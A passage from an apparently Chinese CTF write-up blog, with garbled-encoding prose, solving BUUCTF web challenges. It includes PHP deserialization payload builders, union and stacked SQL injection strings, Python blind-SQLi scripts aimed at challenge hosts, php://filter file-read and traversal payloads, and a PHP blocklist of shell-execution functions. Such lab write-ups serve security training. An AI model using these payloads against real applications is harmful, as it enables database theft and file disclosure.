</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FileHandler</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span> <span class="o">=</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span><span class="c1">//æœ‰ä¸å¯æ‰“å°å­—ç¬¦ä½†åˆä¸èƒ½ä¸¢å¼ƒï¼Œurlç¼–ç 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$o</span> <span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;%00&#39;</span><span class="p">,</span><span class="s1">&#39;\00&#39;</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//å› ä¸ºæ£€æµ‹å‡½æ•°è¦æ±‚å­—ç¬¦åœ¨asciiç 32-125ï¼Œä½†æ˜¯%00ä¸åœ¨èŒƒå›´å†…ï¼Œè¦æ”¹æˆ\00
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$o</span> <span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="s1">&#39;S&#39;</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//æ”¹ä¸º\00åï¼Œååºåˆ—åŒ–åä¸ä¼šè¯†åˆ«\00ï¼Œå°å†™sè¡¨ç¤ºå­—ç¬¦ä¸²,å¤§å†™Sè¡¨ç¤º16è¿›åˆ¶å­—ç¬¦ä¸²
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nv">$o</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>åˆ©ç”¨å½“PHPç‰ˆæœ¬ &gt;= 7.2 æ—¶ï¼Œååºåˆ—åŒ–å¯¹è®¿é—®ç±»åˆ«ä¸æ•æ„Ÿã€‚</p>
<p>ç›´æ¥æ”¹ä¸ºpublic,è¯»å–base64ç¼–ç åçš„flag.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FileHandler</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$op</span><span class="o">=</span><span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$filename</span><span class="o">=</span><span class="s1">&#39;php://filter/convert.base64-encode/resource=flag.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FileHandler</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$o</span> <span class="o">=</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="gxyctf2019babysqli">[GXYCTF2019]BabySQli
</h2><p>exp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39; union select 1,&#39;admin&#39;, &#39; 202cb962ac59075b964b07152d234b70 &#39;#
</span></span><span class="line"><span class="cl">123
</span></span></code></pre></td></tr></table>
</div>
</div><p>æºç è¿™é‡Œæœ‰æç¤º</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208155008477.png"
	width="616"
	height="248"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208155008477_hu2812369422127335082.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250208155008477_hu13273175668499928156.png 1024w"
	loading="lazy"
	
		alt="image-20250208155008477"
	
	
		class="gallery-image" 
		data-flex-grow="248"
		data-flex-basis="596px"
	
></p>
<p>è”åˆæ³¨å…¥ï¼Œç¬¬äºŒä½è¦å¡«adminï¼Œç¬¬ä¸‰ä½å¡«åŠ å¯†åçš„password</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208155137036.png"
	width="1392"
	height="267"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208155137036_hu10957919541577316052.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250208155137036_hu5214047939770289616.png 1024w"
	loading="lazy"
	
		alt="image-20250208155137036"
	
	
		class="gallery-image" 
		data-flex-grow="521"
		data-flex-basis="1251px"
	
></p>
<h2 id="gyctf2020blacklist">[GYCTF2020]Blacklist
</h2><p>å †å æ³¨å…¥</p>
<p>å•å¼•å·é—­åˆ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;;show databases;#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208155750502.png"
	width="790"
	height="733"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208155750502_hu2113050530420817183.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250208155750502_hu11956450240654594529.png 1024w"
	loading="lazy"
	
		alt="image-20250208155750502"
	
	
		class="gallery-image" 
		data-flex-grow="107"
		data-flex-basis="258px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;;show tables;#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208155816697.png"
	width="544"
	height="303"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208155816697_hu3831021482718269588.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250208155816697_hu10878393866591906548.png 1024w"
	loading="lazy"
	
		alt="image-20250208155816697"
	
	
		class="gallery-image" 
		data-flex-grow="179"
		data-flex-basis="430px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;;show columns from FlagHere;#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208160224872.png"
	width="968"
	height="354"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208160224872_hu8232206659628555880.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250208160224872_hu11976986575304260598.png 1024w"
	loading="lazy"
	
		alt="image-20250208160224872"
	
	
		class="gallery-image" 
		data-flex-grow="273"
		data-flex-basis="656px"
	
></p>
<p>è¿™é‡Œæƒ³ç”¨ä¹‹å‰çš„rename,ç¼–ç è½¬æ¢éƒ½ä¸è¡Œ</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208160451361.png"
	width="1184"
	height="78"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208160451361_hu4896993843042465530.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250208160451361_hu16601113639340429147.png 1024w"
	loading="lazy"
	
		alt="image-20250208160451361"
	
	
		class="gallery-image" 
		data-flex-grow="1517"
		data-flex-basis="3643px"
	
></p>
<p>ç”¨handlerè¯­å¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">handler table_name open;handler table_name read first;handler table_name close;
</span></span><span class="line"><span class="cl">handler table_name open;handler table_name read next;handler table_name close;
</span></span><span class="line"><span class="cl">é¦–å…ˆæ‰“å¼€æ•°æ®åº“ï¼Œå¼€å§‹è¯»å®ƒç¬¬ä¸€è¡Œæ•°æ®ï¼Œè¯»å–æˆåŠŸåè¿›è¡Œå…³é—­æ“ä½œã€‚
</span></span><span class="line"><span class="cl">é¦–å…ˆæ‰“å¼€æ•°æ®åº“ï¼Œå¼€å§‹å¾ªç¯è¯»å–ï¼Œè¯»å–æˆåŠŸåè¿›è¡Œå…³é—­æ“ä½œã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ–è€…ç›´æ¥ç”¨ä¹‹å‰çš„payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;;handler FlagHere open as a;handler a read next;#
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ciscn2019-ååŒ—èµ›åŒº-day2-web1hack-world">[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World
</h2><p>sqlæ³¨å…¥ï¼Œä½†æ˜¯è¿‡æ»¤ç©ºæ ¼å’Œè”åˆæ³¨å…¥ï¼ŒæŠ¥é”™æ³¨å…¥ï¼Œç”¨ç›²æ³¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s1">&#39;http://1e88c184-cbcd-4755-bc2e-1122d382e665.node5.buuoj.cn:81/index.php&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">43</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">max</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="cl">    <span class="nb">min</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">127</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">)((</span><span class="nb">max</span><span class="o">+</span><span class="nb">min</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;1^(ascii(substr((select(flag)from(flag)),&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;,1))&gt;&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;)&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span><span class="n">payload</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.005</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;Hello, glzjin wants a girlfriend.&#39;</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="nb">max</span><span class="o">=</span><span class="n">s</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">min</span><span class="o">=</span><span class="n">s</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">((</span><span class="nb">max</span><span class="o">-</span><span class="nb">min</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">max</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œå› ä¸ºæ˜¯orè¢«è¿‡æ»¤ç”¨å¼‚æˆ–ç¬¦å·æ›¿ä»£</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s1">&#39;http://1e88c184-cbcd-4755-bc2e-1122d382e665.node5.buuoj.cn:81/index.php&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">43</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">max</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="cl">    <span class="nb">min</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">127</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">n</span> <span class="o">=</span> <span class="p">(</span><span class="nb">int</span><span class="p">)((</span><span class="nb">max</span><span class="o">+</span><span class="nb">min</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;0^(ascii(substr((select(flag)from(flag)),&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;,1))&gt;&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;)&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span><span class="n">payload</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.005</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;Hello&#39;</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="nb">min</span><span class="o">=</span><span class="n">n</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">max</span><span class="o">=</span><span class="n">n</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">((</span><span class="nb">max</span><span class="o">-</span><span class="nb">min</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">max</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="roarctf-2019easy-java">[RoarCTF 2019]Easy Java
</h2><p>ç‚¹helpï¼Œå‘ç°æ²¡ä»€ä¹ˆç”¨ï¼ŒæŠ“åŒ…æ”¹post</p>
<p>ä¸‹è½½ä¸‹æ¥æ²¡ç”¨ï¼Œç”±äºé¢˜ç›®åç§°æ˜¯javaï¼Œæƒ³åˆ°ä¸‹è½½web.xml</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208204525222.png"
	width="1740"
	height="628"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208204525222_hu12549401992983433739.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250208204525222_hu15083176488674186604.png 1024w"
	loading="lazy"
	
		alt="image-20250208204525222"
	
	
		class="gallery-image" 
		data-flex-grow="277"
		data-flex-basis="664px"
	
></p>
<p>ä¸‹è½½åé¢è¿™ä¸ªclassç±»</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208204630903.png"
	width="1875"
	height="689"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250208204630903_hu431797542549881681.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250208204630903_hu818399688517910433.png 1024w"
	loading="lazy"
	
		alt="image-20250208204630903"
	
	
		class="gallery-image" 
		data-flex-grow="272"
		data-flex-basis="653px"
	
></p>
<p>å¯ä»¥ä¸‹è½½ä¸‹æ¥åç¼–è¯‘æˆ–è€…è¿™é‡Œå°±ç›´æ¥æœ‰base64ç¼–ç çš„å­—ç¬¦ä¸²</p>
<h2 id="bsidescf-2020had-a-bad-day">[BSidesCF 2020]Had a bad day
</h2><p>è¿™é¢˜ä¸»è¦æ˜¯ç”¨åˆ°php://filterä¼ªåè®®å¯ä»¥å¥—ä¸€å±‚åè®®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">category=php://filter/convert.base64-encode/resource=index.php
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209103207749.png"
	width="1668"
	height="708"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209103207749_hu13587277136454511893.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209103207749_hu13179770949394558293.png 1024w"
	loading="lazy"
	
		alt="image-20250209103207749"
	
	
		class="gallery-image" 
		data-flex-grow="235"
		data-flex-basis="565px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°è‡ªåŠ¨æ‹¼æ¥äº†phpåç¼€</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">				<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;category&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">				<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">				<span class="p">{</span>
</span></span><span class="line"><span class="cl">					<span class="k">if</span><span class="p">(</span> <span class="nx">strpos</span><span class="p">(</span> <span class="nv">$file</span><span class="p">,</span> <span class="s2">&#34;woofers&#34;</span> <span class="p">)</span> <span class="o">!==</span>  <span class="k">false</span> <span class="o">||</span> <span class="nx">strpos</span><span class="p">(</span> <span class="nv">$file</span><span class="p">,</span> <span class="s2">&#34;meowers&#34;</span> <span class="p">)</span> <span class="o">!==</span>  <span class="k">false</span> <span class="o">||</span> <span class="nx">strpos</span><span class="p">(</span> <span class="nv">$file</span><span class="p">,</span> <span class="s2">&#34;index&#34;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">						<span class="k">include</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">.</span> <span class="s1">&#39;.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">					<span class="p">}</span>
</span></span><span class="line"><span class="cl">					<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">						<span class="k">echo</span> <span class="s2">&#34;Sorry, we currently only support woofers and meowers.&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">					<span class="p">}</span>
</span></span><span class="line"><span class="cl">				<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">category=woofers/../flag
</span></span></code></pre></td></tr></table>
</div>
</div><p>å°è¯•ç›®å½•ç©¿è¶Šï¼Œç›´æ¥è¯»å–ä¸äº†flag</p>
<p>è¿™é‡Œç”¨åˆ°ä¼ªåè®®å¯ä»¥å¥—ä¸€å±‚åè®®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">category=php://filter/convert.base64-encode/index/resource=flag
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„phpweb">[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb
</h2><p>ç•Œé¢ä¸€ç›´åœ¨è‡ªå·±åˆ·æ–°æˆ‘ä»¬æŠ“åŒ…çœ‹çœ‹</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209135751020.png"
	width="1430"
	height="560"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250209135751020_hu8458753889793069696.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250209135751020_hu12533771697984291941.png 1024w"
	loading="lazy"
	
		alt="image-20250209135751020"
	
	
		class="gallery-image" 
		data-flex-grow="255"
		data-flex-basis="612px"
	
></p>
<p>å¯èƒ½æ˜¯funcå‚æ•°ä¸ºå‡½æ•°ç„¶åpä¸ºå‡½æ•°å€¼ï¼Œæˆ‘ä»¬å…ˆæŸ¥çœ‹index.phpï¼Œç”¨file_get_contents,highlight_file() ï¼Œshow_source()éƒ½è¡Œ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">   <span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$disable_fun</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;exec&#34;</span><span class="p">,</span><span class="s2">&#34;shell_exec&#34;</span><span class="p">,</span><span class="s2">&#34;system&#34;</span><span class="p">,</span><span class="s2">&#34;passthru&#34;</span><span class="p">,</span><span class="s2">&#34;proc_open&#34;</span><span class="p">,</span><span class="s2">&#34;show_source&#34;</span><span class="p">,</span><span class="s2">&#34;phpinfo&#34;</span><span class="p">,</span><span class="s2">&#34;popen&#34;</span><span class="p">,</span><span class="s2">&#34;dl&#34;</span><span class="p">,</span><span class="s2">&#34;eval&#34;</span><span class="p">,</span><span class="s2">&#34;proc_terminate&#34;</span><span class="p">,</span><span class="s2">&#34;touch&#34;</span><span class="p">,</span><span class="s2">&#34;escapeshellcmd&#34;</span><span class="p">,</span><span class="s2">&#34;escapeshellarg&#34;</span><span class="p">,</span><span class="s2">&#34;assert&#34;</span><span class="p">,</span><span class="s2">&#34;substr_replace&#34;</span><span class="p">,</span><span class="s2">&#34;call_user_func_array&#34;</span><span class="p">,</span><span class="s2">&#34;call_user_func&#34;</span><span class="p">,</span><span class="s2">&#34;array_filter&#34;</span><span class="p">,</span> <span class="s2">&#34;array_walk&#34;</span><span class="p">,</span>  <span class="s2">&#34;array_map&#34;</span><span class="p">,</span><span class="s2">&#34;registregister_shutdown_function&#34;</span><span class="p">,</span><span class="s2">&#34;register_tick_function&#34;</span><span class="p">,</span><span class="s2">&#34;filter_var&#34;</span><span class="p">,</span> <span class="s2">&#34;filter_var_array&#34;</span><span class="p">,</span> <span class="s2">&#34;uasort&#34;</span><span class="p">,</span> <span class="s2">&#34;uksort&#34;</span><span class="p">,</span> <span class="s2">&#34;array_reduce&#34;</span><span 